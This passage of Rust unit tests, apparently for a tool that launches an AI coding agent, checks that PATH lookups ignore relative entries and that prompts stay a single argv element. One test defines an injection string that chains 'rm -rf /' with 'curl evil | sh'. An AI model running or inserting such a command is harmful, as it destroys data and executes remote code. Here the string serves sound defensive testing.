        use std::fs;

        let tmp = std::env::temp_dir().join(format!("mdwriter-which-{}", std::process::id()));
        fs::create_dir_all(&tmp).unwrap();
        // Plant an executable-looking file under a relative dir name.
        let rel_dir = "mdwriter_evil_bin";
        let evil_dir = tmp.join(rel_dir);
        fs::create_dir_all(&evil_dir).unwrap();
        let evil = evil_dir.join("totally-unique-binary-xyz");
        fs::write(&evil, b"#!/bin/sh\n").unwrap();

        // PATH set to a *relative* entry plus an empty entry. Neither is
        // absolute, so `which` must skip both and find nothing.
        let saved = std::env::var_os("PATH");
        std::env::set_var("PATH", format!("{rel_dir}:"));
        let found = which("totally-unique-binary-xyz");
        match saved {
            Some(p) => std::env::set_var("PATH", p),
            None => std::env::remove_var("PATH"),
        }
        let _ = fs::remove_dir_all(&tmp);

        assert!(
            found.is_none(),
            "relative/empty PATH entries must not yield a candidate, got {found:?}"
        );
    }

    /// Anything `which` returns is an absolute path to an existing file, so the
    /// spawn-site `is_absolute()` guard is always satisfiable by a real lookup.
    #[test]
    fn which_results_are_absolute_existing_files() {
        // `sh` exists on every unix CI runner under an absolute fallback dir.
        if let Some(p) = which("sh") {
            assert!(p.is_absolute(), "{p:?} should be absolute");
            assert!(p.is_file(), "{p:?} should be a file");
        }
    }

    /// Arguments are carried as a discrete argv vector, never interpolated into
    /// a shell string. A prompt full of shell metacharacters must survive as a
    /// single positional element so no command/argument injection is possible.
    #[test]
    fn build_command_keeps_prompt_as_single_argv_element() {
        let agent = claude_code::ClaudeCodeAgent;
        let nasty = "hi; rm -rf / `whoami` $(echo pwned) && curl evil | sh";
        let cmd = agent.build_command(
            Path::new("/abs/claude"),
            Path::new("/vault"),
            nasty,
            PermissionMode::AcceptEdits,
        );
        // The exact, untouched prompt is exactly one element of argv.
        assert_eq!(
            cmd.args.iter().filter(|a| a.as_str() == nasty).count(),
            1,
            "prompt must appear verbatim as a single argv element: {:?}",
            cmd.args
        );
        // And it is the final positional, after the `--` option terminator.
        assert_eq!(cmd.args.last().map(String::as_str), Some(nasty));
    }
}
